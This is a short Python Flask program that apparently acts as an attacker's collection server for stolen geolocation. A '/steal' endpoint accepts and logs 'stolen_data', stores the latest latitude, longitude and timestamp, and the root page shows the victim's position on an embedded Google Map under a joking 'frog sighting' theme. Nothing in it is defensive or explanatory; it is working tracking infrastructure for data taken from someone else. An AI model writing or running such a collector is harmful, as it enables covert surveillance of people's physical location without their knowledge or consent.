from flask import Flask, request, jsonify

app = Flask(__name__)

latest_location = {"latitude": None, "longitude": None, "timestamp": None}
@app.route('/steal', methods=['POST'])
def steal_data():
    global latest_location
    try:
        data = request.json.get("stolen_data", None)
        print(f"[!] Received: {data}")

        # Safely try to parse JSON string
        import json
        parsed = json.loads(data) if isinstance(data, str) else data
        if "latitude" in parsed and "longitude" in parsed:
            latest_location = parsed
            print("✅ Location updated")

    except Exception as e:
        print("❌ Error parsing data:", e)

    return jsonify({"status": "received"}), 200

    
@app.route('/')
def show_location():
    if latest_location["latitude"] is None:
        return "No frog has screamed yet 🐸"

    lat = latest_location["latitude"]
    lon = latest_location["longitude"]
    time = latest_location["timestamp"]

    return f"""
    <html>
    <head>
        <title>Last Frog Sighting 🐸</title>
        <style>
            body {{ font-family: Arial, sans-serif; text-align: center; margin: 2em; }}
            iframe {{ width: 80%; height: 450px; border: none; }}
        </style>
    </head>
    <body>
        <h1>📍 Last Frog Sighting</h1>
        <p><b>Latitude:</b> {lat}</p>
        <p><b>Longitude:</b> {lon}</p>
        <p><b>Time:</b> {time}</p>

        <h2>🗺️ Location on Map</h2>
        <iframe
            src="https://maps.google.com/maps?q={lat},{lon}&z=15&output=embed"
            allowfullscreen>
        </iframe>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
